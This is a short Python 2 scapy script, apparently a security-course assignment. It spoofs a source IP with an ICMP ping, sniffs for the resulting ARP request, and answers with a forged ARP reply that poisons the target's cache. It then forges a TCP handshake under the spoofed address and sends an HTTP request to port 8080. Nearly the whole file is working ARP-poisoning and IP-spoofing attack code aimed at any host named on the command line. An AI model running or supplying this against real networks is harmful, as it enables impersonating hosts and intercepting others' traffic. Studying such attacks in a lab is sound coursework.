#! /usr/bin/python
"""
cyber assignment 2 question 1
"""

from scapy.all import conf, sniff
from scapy.layers.inet import ARP, IP, TCP, ICMP
from scapy.sendrecv import send, sr1
import argparse
import random
import os
os.environ['http_proxy'] = ''


def spoof(args):
    """
    spoof sends a message to triger a arp and then sniffs for that arp
    """

    spoof_src_ip = args.src

    dst_ip = args.dst
    # sending ping for trigering "who-has" ARP
    print spoof_src_ip, dst_ip
    ip_pkt = IP(src=spoof_src_ip, dst=dst_ip)

    send(ip_pkt / ICMP())


    print "Poisoned ARP sent, waiting for response..."
    def arp_posion(pkt):
        """
        ARP posioning and send http
        """
        if ARP in pkt \
            and pkt[ARP].psrc == dst_ip \
            and pkt[ARP].pdst == spoof_src_ip:
            random_port = random.randint(1024, 65535)

            # since we didnt specify a hwsrc the packet is being sent from us
            send(ARP(op="is-at", psrc=spoof_src_ip, pdst=dst_ip))
            print "ARP Poisoning was successfull!"
            print "Attempting to initiate HTTP connection..."
            # spoofed Hand Shake
            ip_pkt = IP(src=spoof_src_ip, dst=dst_ip)
            tcp_pkt = TCP(dport=8080, sport=random_port, \
                seq=random.randint(0, 100000), flags='S')
            syn_ack = sr1(ip_pkt / tcp_pkt)

            print "Got SYN+ACK, returning ACK..."

            tcp_pkt = TCP(dport=8080, sport=random_port, \
            seq=syn_ack[TCP].ack, ack=(syn_ack[TCP].seq + 1), flags='A')

            send(ip_pkt / tcp_pkt)
            http_msg = "GET / HTTP/1.1\r\nContent-Length: " \
            + str(len(args.msg)) + "\r\n\r\n" + args.msg
            sr1(ip_pkt / tcp_pkt / http_msg, timeout=30)
            exit()

    sniff(prn=arp_posion)



if __name__ == '__main__':
    #if len(sys.argv) not in range(4, 5):
    #    exit('Invalid arguments!')

    PARS = argparse.ArgumentParser()
    PARS.add_argument('-src', help="Source IP")
    PARS.add_argument('-dst', help="Destination IP")
    PARS.add_argument('-msg', help="HTTP message")

    print "SPOOFIN"
    spoof(PARS.parse_args())
